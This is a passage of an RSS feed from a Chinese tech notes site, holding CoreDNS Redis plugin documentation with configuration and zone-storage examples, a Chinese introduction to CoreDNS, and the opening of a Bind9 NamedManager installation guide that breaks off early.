      <guid>https://www.geekery.cn/note-book/CoreDNS/CoreDNS%E4%BD%BF%E7%94%A8Redis%E6%8F%92%E4%BB%B6.html</guid>
      <source url="https://www.geekery.cn/rss.xml">CoreDNS使用Redis插件</source>
      <description>CoreDNS使用Redis插件 Description redis enables reading zone data from redis database. this plugin should be located right next to etcd in plugins.cfg Syntax redis loads authoritativ...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>Description</h2>
<p><em>redis</em> enables reading zone data from redis database.
this plugin should be located right next to <em>etcd</em> in <em>plugins.cfg</em></p>
<h2>Syntax</h2>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>redis</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>redis loads authoritative zones from redis server</p>
<p>address will default to local redis serrver (localhost:6379)</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">redis</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ADDR</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    password</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PWD</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    prefix</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PREFIX</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    suffix</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SUFFIX</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    connect_timeout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TIMEOUT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    read_timeout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TIMEOUT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    ttl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TTL</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><code>address</code> is redis server address to connect in the form of <em>host:port</em> or <em>ip:port</em>.</li>
<li><code>password</code> is redis server <em>auth</em> key</li>
<li><code>connect_timeout</code> time in ms to wait for redis server to connect</li>
<li><code>read_timeout</code> time in ms to wait for redis server to respond</li>
<li><code>ttl</code> default ttl for dns records, 300 if not provided</li>
<li><code>prefix</code> add PREFIX to all redis keys</li>
<li><code>suffix</code> add SUFFIX to all redis keys</li>
</ul>
<h2>Examples</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    redis</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> example.com</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> localhost:6379</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        password</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> foobared</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        connect_timeout</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 100</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        read_timeout</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 100</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        ttl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 360</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        prefix</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> _dns:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>Reverse Zones</h2>
<p>reverse zones is not supported yet.</p>
<h2>Proxy</h2>
<p>proxy is not supported yet.</p>
<h2>Zone Format in redis db</h2>
<h3>Zones</h3>
<p>each zone is stored in redis as a hash map with <em>zone</em> as key</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>redis-cli&gt;KEYS *</span></span>
<span class="line"><span>1) "example.com."</span></span>
<span class="line"><span>2) "example.net."</span></span>
<span class="line"><span>redis-cli&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>DNS RRs</h3>
<p>dns RRs are stored in redis as json strings inside a hash map using address as field key.
<em>@</em> is used for zone's own RR values.</p>
<h4>A</h4>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "a"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "ip4"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"1.2.3.4"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "ttl"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">360</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>AAAA</h4>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "aaaa"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "ip6"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"::1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "ttl"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">360</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>CNAME</h4>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "cname"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "host"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"x.example.com."</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "ttl"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">360</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>TXT</h4>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "txt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "text"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"this is a text"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "ttl"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">360</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>NS</h4>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "ns"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "host"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"ns1.example.com."</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "ttl"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">360</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>MX</h4>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "mx"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "host"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"mx1.example.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "priority"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "ttl"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">360</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>SRV</h4>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "srv"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "host"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"sip.example.com."</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "port"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">555</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "priority"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "weight"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">100</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "ttl"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">360</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>SOA</h4>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "soa"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "ttl"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">100</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "mbox"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"hostmaster.example.com."</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "ns"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"ns1.example.com."</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "refresh"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">44</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "retry"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">55</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "expire"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">66</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>Example</h4>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>$ORIGIN example.net.</span></span>
<span class="line"><span> example.net.                 300 IN  SOA   &lt;SOA RDATA&gt;</span></span>
<span class="line"><span> example.net.                 300     NS    ns1.example.net.</span></span>
<span class="line"><span> example.net.                 300     NS    ns2.example.net.</span></span>
<span class="line"><span> *.example.net.               300     TXT   "this is a wildcard"</span></span>
<span class="line"><span> *.example.net.               300     MX    10 host1.example.net.</span></span>
<span class="line"><span> sub.*.example.net.           300     TXT   "this is not a wildcard"</span></span>
<span class="line"><span> host1.example.net.           300     A     5.5.5.5</span></span>
<span class="line"><span> _ssh.tcp.host1.example.net.  300     SRV   &lt;SRV RDATA&gt;</span></span>
<span class="line"><span> _ssh.tcp.host2.example.net.  300     SRV   &lt;SRV RDATA&gt;</span></span>
<span class="line"><span> subdel.example.net.          300     NS    ns1.subdel.example.net.</span></span>
<span class="line"><span> subdel.example.net.          300     NS    ns2.subdel.example.net.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>above zone data should be stored at redis as follow:</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>redis-cli&gt; hgetall example.net.</span></span>
<span class="line"><span> 1) "_ssh._tcp.host1"</span></span>
<span class="line"><span> 2) "{\"srv\":[{\"ttl\":300, \"target\":\"tcp.example.com.\",\"port\":123,\"priority\":10,\"weight\":100}]}"</span></span>
<span class="line"><span> 3) "*"</span></span>
<span class="line"><span> 4) "{\"txt\":[{\"ttl\":300, \"text\":\"this is a wildcard\"}],\"mx\":[{\"ttl\":300, \"host\":\"host1.example.net.\",\"preference\": 10}]}"</span></span>
<span class="line"><span> 5) "host1"</span></span>
<span class="line"><span> 6) "{\"a\":[{\"ttl\":300, \"ip\":\"5.5.5.5\"}]}"</span></span>
<span class="line"><span> 7) "sub.*"</span></span>
<span class="line"><span> 8) "{\"txt\":[{\"ttl\":300, \"text\":\"this is not a wildcard\"}]}"</span></span>
<span class="line"><span> 9) "_ssh._tcp.host2"</span></span>
<span class="line"><span>10) "{\"srv\":[{\"ttl\":300, \"target\":\"tcp.example.com.\",\"port\":123,\"priority\":10,\"weight\":100}]}"</span></span>
<span class="line"><span>11) "subdel"</span></span>
<span class="line"><span>12) "{\"ns\":[{\"ttl\":300, \"host\":\"ns1.subdel.example.net.\"},{\"ttl\":300, \"host\":\"ns2.subdel.example.net.\"}]}"</span></span>
<span class="line"><span>13) "@"</span></span>
<span class="line"><span>14) "{\"soa\":{\"ttl\":300, \"minttl\":100, \"mbox\":\"hostmaster.example.net.\",\"ns\":\"ns1.example.net.\",\"refresh\":44,\"retry\":55,\"expire\":66},\"ns\":[{\"ttl\":300, \"host\":\"ns1.example.net.\"},{\"ttl\":300, \"host\":\"ns2.example.net.\"}]}"</span></span>
<span class="line"><span>redis-cli&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>理解CoreDNS</title>
      <link>https://www.geekery.cn/note-book/CoreDNS/%E7%90%86%E8%A7%A3CoreDNS.html</link>
      <guid>https://www.geekery.cn/note-book/CoreDNS/%E7%90%86%E8%A7%A3CoreDNS.html</guid>
      <source url="https://www.geekery.cn/rss.xml">理解CoreDNS</source>
      <description>理解CoreDNS 什么是CoreDNS【官方解释】 CoreDNS 是一个 DNS 服务器。它是用Go编写的。 CoreDNS 不同于其他 DNS 服务器，例如（所有优秀的） BIND、 Knot、 PowerDNS和 Unbound（技术上是解析器，但仍然值得一提），因为它非常灵活，几乎所有功能都外包到插件中。 插件可以是独立的，也可以协同工作以执...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>什么是CoreDNS【官方解释】</h2>
<p>CoreDNS 是一个 DNS 服务器。它是用<a href="https://golang.org/" target="_blank" rel="noopener noreferrer">Go</a>编写的。</p>
<p>CoreDNS 不同于其他 DNS 服务器，例如（所有优秀的） <a href="https://www.isc.org/bind/" target="_blank" rel="noopener noreferrer">BIND</a>、 <a href="https://www.knot-dns.cz/" target="_blank" rel="noopener noreferrer">Knot</a>、 <a href="https://www.powerdns.com/" target="_blank" rel="noopener noreferrer">PowerDNS</a>和 <a href="https://www.unbound.net/" target="_blank" rel="noopener noreferrer">Unbound</a>（技术上是解析器，但仍然值得一提），因为它非常灵活，几乎所有功能都外包到插件中。</p>
<p>插件可以是独立的，也可以协同工作以执行“DNS 功能”。</p>
<p>那么什么是“DNS 功能”？就 CoreDNS 而言，我们将其定义为一个实现 CoreDNS Plugin API 的软件。实现的功能可能会有很大的偏差。有些插件本身不会创建响应，例如<a href="https://coredns.io/plugins/metrics" target="_blank" rel="noopener noreferrer">metrics</a>或 <a href="https://coredns.io/plugins/cache" target="_blank" rel="noopener noreferrer">cache</a>，但会添加功能。然后有一些插件<em>会</em>生成响应。这些也可以做任何事情：有与 <a href="https://coredns.io/plugins/kubernetes" target="_blank" rel="noopener noreferrer">Kubernetes</a>通信以提供服务发现的插件，有从<a href="https://coredns.io/plugins/file" target="_blank" rel="noopener noreferrer">文件</a>或<a href="https://coredns.io/explugins/pdsql" target="_blank" rel="noopener noreferrer">数据库</a>读取数据的插件。</p>
<p>目前默认的 CoreDNS 安装中包含大约 30 个插件，但也有一大堆<a href="https://coredns.io/explugins" target="_blank" rel="noopener noreferrer">外部</a>插件，您可以将它们编译到 CoreDNS 中以扩展其功能。</p>
<blockquote>
<p>CoreDNS 由插件提供支持。</p>
</blockquote>
<p>编写新<a href="https://coredns.io/manual/toc/#writing-plugins" target="_blank" rel="noopener noreferrer">插件</a>应该很容易，但需要了解 Go 并深入了解 DNS 的工作原理。CoreDNS 抽象出很多 DNS 细节，这样你就可以专注于编写你需要的插件功能</p>
<h2>具有什么特点</h2>
<ul>
<li>主体文件仅一个二进制问文件，实现基本功能，其他功能都有插件实现</li>
<li>Go语言编写，</li>
<li>有强大的云原生社区支持</li>
</ul>
<p>|                                                              | CoreDNS  | BIND     |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>Bind9之Web管理NamedManager</title>
      <link>https://www.geekery.cn/note-book/DNS/Bind9%E4%B9%8BWeb%E7%AE%A1%E7%90%86NamedManager.html</link>
      <guid>https://www.geekery.cn/note-book/DNS/Bind9%E4%B9%8BWeb%E7%AE%A1%E7%90%86NamedManager.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Bind9之Web管理NamedManager</source>
      <description>Bind9之Web管理NamedManager NamedManager 是一个基于Web的DNS管理系统，**可用来添加、调整和删除DNS的zones/records数据。**它使用Bind作为底层DNS服务，提供一个现代Ajax的Web界面，支持 IPv4和IPv6。该应用程序很稳定，在生产环境中使用没有任何问题。过多的介绍在此就不做说明了，下面说...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>NamedManager 是一个基于Web的DNS管理系统，**可用来添加、调整和删除DNS的zones/records数据。**它使用Bind作为底层DNS服务，提供一个现代Ajax的Web界面，支持 IPv4和IPv6。该应用程序很稳定，在生产环境中使用没有任何问题。过多的介绍在此就不做说明了，下面说下NamedManager环境部署过程：</p>
<h2>1）下载NamedManager的rpm安装包</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@dns ~]# hostname</span></span>
